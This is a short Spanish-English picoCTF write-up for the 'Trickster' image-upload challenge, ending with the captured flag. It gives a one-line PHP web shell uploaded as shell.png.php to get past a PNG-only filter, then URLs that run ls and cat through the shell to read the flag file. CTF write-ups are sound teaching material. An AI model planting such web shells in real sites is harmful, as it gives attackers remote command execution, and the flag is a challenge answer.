## Descripción 
I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:59695/)!
## Solución 
Trickster
    - Usaremos el web shell:
	    Archivo .png.php con lo siguiente
```
	    PHP
    `<?php if(isset($_REQUEST['cmd']))      system($_REQUEST['cmd']); ?>`
    
```
    - Lo subimos a la aplicación
    - Ejecutamos comandos usando webshell, que asumimos se guardo en /uploads

```
    http://atlas.picoctf.net:56241/uploads/shell.png.php?cmd=ls http://atlas.picoctf.net:56241/uploads/shell.png.php?cmd=ls .. http://atlas.picoctf.net:56241/uploads/shell.png.php?cmd= cat ../GAZWIMLEGU2DQ.txt

```
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17}

## Notas
## Referencias
